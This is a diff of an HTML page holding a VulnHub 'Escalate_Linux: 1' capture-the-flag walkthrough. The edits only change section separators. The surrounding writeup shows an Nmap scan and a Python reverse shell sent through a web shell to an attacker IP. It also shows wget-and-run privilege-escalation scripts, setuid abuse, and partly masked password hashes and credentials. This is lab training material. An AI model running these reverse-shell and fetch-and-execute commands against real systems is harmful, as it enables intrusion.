@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20190911_vulnhub-fristikeals1dot3.html"> « </a>📅 published on <code>17/Sep/2019</code><a href="/posts/20190918_vulnhub-quaoar.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">Escalate_Linux: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_escalatelinux/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_escalatelinux/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>80/tcp/http/Apache httpd 2.4.29 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_python_reverseshell">exploit_python_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_creds">privesc_mysql_creds</a>, <a href="https://github.com/7h3rAm/writeups#privesc_setuid">privesc_setuid</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Tue Sep 17 11:47:37 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.escalatelinux/results/192.168.92.173/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.escalatelinux/results/192.168.92.173/scans/xml/_quick_tcp_nmap.xml 192.168.92.173
 Nmap scan report for 192.168.92.173
@@ -162,14 +162,14 @@ DOWNLOADED: 27558 - FOUND: 4
 <h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
 <pre class="nested"><code>ssh: root, mysql, user1, user2, user3, user4, user5, user6, user7, user8
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We set up a <code>netcat</code> listener and invoke a Python reverse shell:  </p>
 <pre class="nested"><code>nc -nlvp 9999
 http://192.168.92.173/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.92.163&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot01.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_escalatelinux/screenshot02.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>user6@osboxes&gt; id
 uid=1005(user6) gid=1005(user6) groups=1005(user6)
 user6@osboxes&gt;  
@@ -198,7 +198,7 @@ user6
 user7
 user8
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. We start with downloading the privesc enumerations scripts:  </p>
 <pre class="nested"><code>wget http://192.168.92.163:8000/lse.sh ; chmod +x ./lse.sh ; ./lse.sh | tee lse.txt
 wget http://192.168.92.163:8000/linenum.sh ; chmod +x ./linenum.sh ; ./linenum.sh | tee linenum.txt
@@ -226,7 +226,7 @@ chmod +x ./.script.sh
 /home/user3/shell
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_escalatelinux/screenshot09.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM........................
 user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2........................
@@ -243,7 +243,7 @@ user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsE
 <pre class="nested"><code>ssh: root/123..
 mysql: mysql/mysql@1....
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">https://www.vulnhub.com/entry/escalate_linux-1,323/</a>  </li>
 </ul>
